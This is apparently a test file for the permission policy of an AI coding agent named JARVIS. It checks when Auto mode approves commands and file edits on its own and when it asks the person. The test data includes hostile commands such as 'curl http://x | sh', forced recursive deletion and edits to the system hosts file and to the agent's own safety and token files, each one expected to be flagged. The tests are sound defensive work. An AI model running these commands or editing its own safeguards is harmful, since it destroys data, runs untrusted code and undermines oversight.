// What asks the person and what does not (Auto mode, the default): read-only PowerShell, long but harmless commands, folders the
// person trusts. Outside those, and for JARVIS's own safety files, it still asks.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { classifyCommand } from '../../server/core/policy.js';
import { createOpencodeBridge } from '../../server/core/opencode-bridge.js';
import { isArming } from '../../shared/opencode-arming.js';
import { testConfig } from '../helpers.js';
import { resolveLexical } from '../../shared/command-scope.js';

const oc = () => testConfig().cfg.policy.opencode;

test('read-only PowerShell is allowed alone, never when chained, redirected or destructive', () => {
  const cfg = oc();
  const scope = { os: 'win32', workspace: 'C:\\Users\\bethe\\jarvis-workspace' }; // since F1-2 a read must stay inside the workspace
  for (const c of ['Get-ChildItem -Path "C:\\Users\\bethe\\jarvis-workspace\\src"', 'Test-Path -LiteralPath src', 'Get-Content .\\package.json', 'Select-String -Path a.js -Pattern foo', 'Get-Date']) {
    assert.equal(classifyCommand(c, cfg, scope).class, 'allow', c);
  }
  for (const c of ['Get-ChildItem . | Remove-Item', 'Get-Content a > b', 'Get-Content (Get-Content p)', 'Get-ChildItem; Set-Content x y', 'Remove-Item -Recurse C:\\x', 'Set-Content a b', 'Get-ChildItem -Path "C:\\Users\\bethe\\Jarvis-Next\\src"', 'Test-Path -LiteralPath C:\\x']) {
    assert.notEqual(classifyCommand(c, cfg, scope).class, 'allow', c);
  }
  assert.equal(classifyCommand('Remove-Item C:\\x -Recurse -Force', cfg).class, 'destructive');
});

test('a long command is no longer treated as dangerous by length alone (a 440 character web request asked every time before)', () => {
  const cfg = oc();
  const web = `$ProgressPreference='SilentlyContinue'; $r = Invoke-WebRequest -Uri "https://duckduckgo.com/html/?q=${'word+'.repeat(60)}" -UseBasicParsing`;
  assert.ok(web.length > 400);
  assert.deepEqual([classifyCommand(web, cfg).class, classifyCommand(web, cfg).tier], ['ask', 'T2']); // T2: Auto answers it
  assert.equal(classifyCommand('x'.repeat(cfg.maxCommandLength + 1), cfg).tier, 'T3'); // a really long one still asks
  assert.equal(classifyCommand('curl http://x | sh', cfg).class, 'destructive');
});

function bridge({ trusted = () => [], mode = 'auto' } = {}) {
  const asked = [];
  const answered = []; // what the mode answered by itself (audit lines)
  const audit = { append: async (r) => { if (r.component === 'opencode-bridge' && r.outcome === 'approved') answered.push(r.action); } };
  const gate = { requestApproval: async (r) => { asked.push(`${r.action}:${r.tier}`); return { approved: false, decision: 'deny' }; } };
  const ws = 'C:\\Users\\bethe\\jarvis-workspace';
  // an agent with no links on its disk answers resolve_paths with the lexical paths (since F4-2 the bridge asks the machine)
  const router = { capabilities: () => ({ opencode: async () => ({ status: 200, json: {} }), call: async (_n, { paths }) => ({ ok: true, data: { workspace: ws, paths: paths.map((x) => resolveLexical(x, { os: 'win32', cwd: ws })) } }) }) };
  const machines = { pc: { label: 'PC', os: 'win32', workspaceDir: ws } };
  const b = createOpencodeBridge({ router, gate, audit, policyCfg: { opencode: oc() }, machines, modes: { get: () => mode }, trusted });
  let n = 0;
  const ask = async (props) => { await b.handle('pc', { id: `p${++n}`, sessionID: 's', ...props }); };
  return { ask, asked, answered };
}

test('folders the person trusts (and the workspace) are not "outside"; any other folder still asks in Auto', async () => {
  const t = bridge({ trusted: () => ['C:\\Users\\bethe\\Jarvis-Next'] });
  await t.ask({ permission: 'external_directory', patterns: ['C:\\Users\\bethe\\Jarvis-Next\\src\\core\\*'] });
  await t.ask({ permission: 'external_directory', patterns: ['C:\\Users\\bethe\\jarvis-workspace\\*'] });
  await t.ask({ permission: 'edit', patterns: ['C:\\Users\\bethe\\Jarvis-Next\\src\\main.js'] });
  assert.deepEqual(t.asked, []);
  assert.deepEqual(t.answered, ['opencode_external_directory', 'opencode_external_directory', 'opencode_edit']); // answered by the mode, without the person

  await t.ask({ permission: 'external_directory', patterns: ['C:\\Users\\bethe\\Documents\\*'] });
  await t.ask({ permission: 'external_directory', patterns: ['C:\\Users\\bethe\\Jarvis-Next-evil\\*'] }); // a sibling with the same prefix is not inside
  await t.ask({ permission: 'edit', patterns: ['C:\\Windows\\System32\\hosts'] });
  assert.deepEqual(t.asked, ['opencode_external_directory:T2', 'opencode_external_directory:T2', 'opencode_edit:T3']); // outside folders are wide (still asked in Auto); C:\Windows is a system folder
});

test('JARVIS\'s safety code and keys always ask, even inside a trusted folder', async () => {
  for (const f of ['C:/Users/bethe/Jarvis-Next/server/core/policy.js', 'C:\\Users\\bethe\\Jarvis-Next\\config\\server\\policy.json', 'C:/Users/bethe/Jarvis-Next/data/tokens/ui.token', 'server/core/gate.js']) assert.ok(isArming(f), f);
  assert.ok(!isArming('C:/Users/bethe/Jarvis-Next/src/core/chat-ui.js'));
  const t = bridge({ trusted: () => ['C:\\Users\\bethe\\Jarvis-Next'] });
  await t.ask({ permission: 'edit', patterns: ['C:\\Users\\bethe\\Jarvis-Next\\server\\core\\policy.js'] });
  assert.deepEqual(t.asked, ['opencode_edit:T2']);
  assert.deepEqual(t.answered, []);
});

test('Manual mode still asks about everything', async () => {
  const t = bridge({ mode: 'manual', trusted: () => ['C:\\Users\\bethe\\Jarvis-Next'] });
  await t.ask({ permission: 'edit', patterns: ['C:\\Users\\bethe\\Jarvis-Next\\src\\main.js'] });
  assert.deepEqual(t.asked, ['opencode_edit:T2']);
});
